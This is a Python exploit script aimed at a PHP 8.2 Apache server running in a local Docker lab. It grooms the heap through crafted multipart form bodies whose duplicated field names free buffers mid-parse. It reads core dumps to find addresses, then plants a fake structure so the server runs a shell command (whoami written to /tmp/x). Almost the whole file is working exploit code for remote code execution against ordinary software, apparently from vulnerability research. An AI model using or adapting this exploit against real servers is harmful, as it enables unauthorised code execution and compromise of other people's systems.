#!/usr/bin/env python3
"""oom140b: PAIRED-RING ARM, retained-profile-faithful.

oom140 post-mortem: tiny pair names ("q784") removed ~600KB of RETAINED
registry memory -> memory_limit never crossed at the sea -> http=200, no
fatal, no walk, no crash. The fatal point tracks RETAINED bytes (registry
names+values), not wire size.

Design:
- Pair window 700..1100 (brackets the proven fatal point ~idx 863): each
  pair = IDENTICAL full-length oom134-style name twice. Entry 1 value =
  3060B ring (ptr8 at offsets 8 mod 16, 0xde filler); entry 2 value = "v"
  -> PHP overwrites -> efrees the ring mid-parse into the 3088 bin.
- Retained per slot ~= oom134's names -> fatal lands INSIDE the window,
  freshest freed rings in the tail.
- Pair headers add ~840KB wire -> absorbed by shrinking poison part 0
  (post-cut: never parsed, wire-only). Total length == oom134 body length.
- Measure: rdi must equal SIG8 EXACTLY (trip at ring value offset 8 =
  ptr8). Arm: ring = cell(B), block overlaid in tag part 780's value,
  B = A+OFF from the measure core.

Win: test -f /tmp/x after every fire.
"""
import struct, subprocess, time, urllib.request, urllib.error, re
import payload68 as P

HOST = "http://127.0.0.1:8083"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
MAGIC = 0xC0DEBA5E
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)
T16 = SIG8 + struct.pack("<Q", 0xDFE2C0DE51E2C0DF)
K1 = 4200
TAG_PART = 780
PAIR_LO, PAIR_HI = 700, 1100       # 400 paired parts, tag exempt
VLEN = 3060                        # ring value len -> 3088 bin
CORE = "/tmp/core.140b"
BASE = 0

def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def sh(cmd, timeout=120):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()

def x_state():
    return sh("test -f /tmp/x && echo X_EXISTS:$(cat /tmp/x) || echo NO_X").strip()

def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))

def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8083:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False

def post_mod(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None

def cell(addr):
    return struct.pack("<Q", addr)

def hdr(name_bytes):
    return (b'--BOUND\r\nContent-Disposition: form-data; name="' + name_bytes + b'"\r\n\r\n')

def kname(i, shrink=0, tile=None):
    """oom134 name geometry: 'p' + filler + idx + '[x]'."""
    n = P.KEYLEN - 8 - shrink
    if tile is not None:
        fill = (n // 16) * 16
        filler = (tile * (fill // 16 + 1))[:fill]
    else:
        filler = b"K" * n
    return b"p" + filler + (b"%d" % i) + b"[x]"

def ring_value(ptr8):
    """3060B: ptr8 at every value offset 8 mod 16, 0xde filler elsewhere."""
    v = bytearray(b"\xde" * VLEN)
    for s in range(8, VLEN - 8, 16):
        v[s:s + 8] = ptr8
    return bytes(v)

def tag_value(i, B=None, OFF=0, arm=False):
    if not arm:
        return struct.pack("<QQ", MAGIC + i, MAGIC + i) + b"v" * (1537 - 32)
    v = bytearray(b"v" * 1537)
    v[0:16] = struct.pack("<QQ", MAGIC + i, MAGIC + i)
    st = struct.pack_into
    st("<II", v, OFF + 0x00, 1, 0x108)
    st("<II", v, OFF + 0x08, 1, 0)
    st("<Q", v, OFF + 0x10, 0)
    st("<Q", v, OFF + 0x18, B + 0x68)
    st("<I", v, OFF + 0x2C, 1)
    st("<Q", v, OFF + 0x50, B + 0x90)
    v[OFF + 0x58] = 6
    st("<I", v, OFF + 0x5C, 0x106)
    st("<Q", v, OFF + 0x68, 0)
    st("<Q", v, OFF + 0x70, BASE + ZIF)
    st("<IIQQ", v, OFF + 0x90, 1, 0x106, 0, len(CMD))
    v[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
    return bytes(v)

def build(ptr8=SIG8, B=None, OFF=0, arm=False):
    """Body with paired ring sea. Wire length auto-corrected to oom134's
    proven length by shrinking poison part 0 (post-cut, never parsed)."""
    # oom134 baseline (proven): tiled name sea 700..1000, tag 780
    base_ps = []
    for i in range(K1):
        shrink = 1536 if i == TAG_PART else 0
        tile = T16 if 700 <= i < 1000 else None
        nm = kname(i, shrink=shrink, tile=tile)
        val = (struct.pack("<QQ", MAGIC + i, MAGIC + i) + b"v" * (1537 - 32)
               + struct.pack("<QQ", MAGIC + i, MAGIC + i)) if i == TAG_PART else b"v"
        base_ps.append(hdr(nm) + val + b"\r\n")
    base_len = len(b"".join(base_ps)) + sum(len(P.poison_part(n, 5000000 + n * P.CELLS)) for n in range(P.PREP)) + len(b"--BOUND--\r\n")

    ps = []
    for i in range(K1):
        if i == TAG_PART:
            ps.append(hdr(kname(i, shrink=1536, tile=T16)) + tag_value(i, B, OFF, arm) + b"\r\n")
        elif PAIR_LO <= i < PAIR_HI:
            h = hdr(kname(i))
            ps.append(h + ring_value(ptr8) + b"\r\n")   # entry 1: ring value
            ps.append(h + b"v\r\n")                      # entry 2: overwrite -> efree ring
        else:
            ps.append(hdr(kname(i)) + b"v\r\n")
    tail_len = len(b"--BOUND--\r\n") + sum(len(P.poison_part(n, 5000000 + n * P.CELLS)) for n in range(1, P.PREP))
    extra = (len(b"".join(ps)) + tail_len) - base_len
    assert extra > 0, "pairs cheaper than baseline? extra=%d" % extra
    ps.append(P.poison_part(0, 5000000 - extra))         # wire-only shrink
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(1, P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps), extra

def pull_core():
    """oom134 verbatim: two-hop /tmp/core -> host -> phpbuild. Freshness is
    guaranteed by fire() rm-ing /tmp/core BEFORE each post."""
    subprocess.run(["docker", "cp", "php_vuln:/tmp/core", "/tmp/core.tmp"], capture_output=True)
    subprocess.run(["docker", "cp", "/tmp/core.tmp", "phpbuild:" + CORE], capture_output=True)
    m = subprocess.run(["docker", "exec", "phpbuild", "md5sum", CORE], capture_output=True)
    print("core ->", CORE, m.stdout.decode().strip()[:44])
    return CORE

def fire(body, tries):
    """oom134 fire() verbatim: fresh-core rm, segv delta, patient 10x2s poll."""
    for t in range(tries):
        sh("rm -f /tmp/core")
        n0 = segv_count()
        c, r = post_mod(body)
        crashed = False
        for _ in range(10):
            time.sleep(2)
            if segv_count() > n0 or sh("test -f /tmp/core && echo y") == "y":
                crashed = True
                break
        print("try%d: http=%s segv+%d core=%s"
              % (t, c, segv_count() - n0,
                 sh("test -f /tmp/core && echo y") == "y"), flush=True)
        if crashed:
            return True
    return False

RDI_SCRIPT = r"""
import struct, sys
f = open(sys.argv[1], 'rb').read()
i = f.find(b'CORE')
while i != -1:
    namesz, descsz, typ = struct.unpack_from('<III', f, i - 8)
    if typ == 1 and descsz > 200:
        regs = struct.unpack_from('<27Q', f, i + 32)
        print('RDI=0x%x' % regs[1]); break
    i = f.find(b'CORE', i + 4)
"""

def rdi_of(core):
    r = subprocess.run(["docker", "exec", "phpbuild", "python3", "-c", RDI_SCRIPT, core],
                       capture_output=True, timeout=120)
    m = re.search(r"RDI=0x([0-9a-f]+)", r.stdout.decode())
    return int(m.group(1), 16) if m else None

def tag_addr(core):
    r = subprocess.run(["docker", "exec", "phpbuild", "python3", "-c", """
import struct, sys
f = open(sys.argv[1], 'rb').read()
t = struct.pack('<QQ', %d, %d)
j = f.find(t)
if j < 0:
    print('NO'); sys.exit()
e_phoff = struct.unpack_from('<Q', f, 0x20)[0]
e_phentsize, e_phnum = struct.unpack_from('<HH', f, 0x36)
for k in range(e_phnum):
    off = e_phoff + k * e_phentsize
    p_type, p_flags, p_off, p_vaddr, p_paddr, p_filesz = struct.unpack_from('<IIQQQQ', f, off)
    if p_type == 1 and p_off <= j < p_off + p_filesz:
        print('A=0x%%x' %% (p_vaddr + (j - p_off))); break
""" % (MAGIC + TAG_PART, MAGIC + TAG_PART), core], capture_output=True, timeout=120)
    m = re.search(r"A=0x([0-9a-f]+)", r.stdout.decode())
    return int(m.group(1), 16) if m else None

def aim(A):
    for OFF in range(0x40, 1537 - 0xB8, 16):
        B = A + OFF
        if B % 16 == 8 and (B >> 56) == 0 and ((B >> 8) & 1) == 1 and ((B >> 9) & 1) == 0:
            return B, OFF
    return None, None

def main():
    global BASE
    print("=== oom140b: paired-ring arm (retained-profile-faithful) ===")
    c, o = get(HOST + "/oom_sapi.php")
    print("sapi:", o.strip()[:60])
    assert sh("md5sum /usr/lib/apache2/modules/libphp.so").split()[0] == STOCK_MD5
    print("md5 ok")
    assert recreate(), "recreate failed"
    BASE = base_now()
    print("base=0x%x" % BASE)

    # H-SHAPE LAW: warm the worker with stock posts k1=1900..3400 BEFORE any
    # measured fire (oom134:157/oom137:244 protocol). Skipping = no fatal,
    # http=200 straight through (both oom140 variants died here).
    for k1 in P.K1S[:-1]:
        post_mod(P.build_attack(k1, 5000000))
    print("shaped segv=%d" % segv_count(), flush=True)

    m_body, extra = build(ptr8=SIG8)
    print("envelope: pairs wire extra=%d absorbed by poison[0]" % extra)

    # ---- measure: ring = SIG8 -> crash rdi must equal SIG8 exactly ----
    rdi = A = None
    if fire(m_body, tries=6):
        core = pull_core()
        rdi = rdi_of(core)
        A = tag_addr(core)
        print("meas core: rdi=0x%x tag_A=%s" % (rdi if rdi else 0,
              "0x%x" % A if A else "NONE"))
    if rdi is None:
        print("no measure crash -> abort"); print("final x:", x_state()); print("=== done ==="); return
    if rdi != struct.unpack("<Q", SIG8)[0]:
        print("rdi != SIG8 exact -> slot math wrong -> abort (diagnose before arm)")
        print("final x:", x_state()); print("=== done ==="); return
    if A is None:
        print("no tag anchor -> abort"); print("final x:", x_state()); print("=== done ==="); return
    B, OFF = aim(A)
    if B is None:
        print("aim failed (A=0x%x)" % A); print("final x:", x_state()); print("=== done ==="); return
    print("SLOT MATH CONFIRMED: rdi==SIG8. A=0x%x B=0x%x OFF=0x%x" % (A, B, OFF))

    # ---- arm: ring = B ----
    a_body, _e = build(ptr8=cell(B), B=B, OFF=OFF, arm=True)
    if fire(a_body, tries=12):
        pass
    for t in range(4):
        xs = x_state()
        if xs.startswith("X_EXISTS"):
            print("*** WON *** %s" % xs); return
        time.sleep(3)
    if segv_count() > 3:
        core = pull_core()
        r = rdi_of(core)
        print("arm crash rdi=0x%x want=0x%x %s" % (r if r else 0, B,
              "MATCH" if r == B else "MISS"))
    print("final x:", x_state())
    print("=== done ===")

if __name__ == "__main__":
    main()
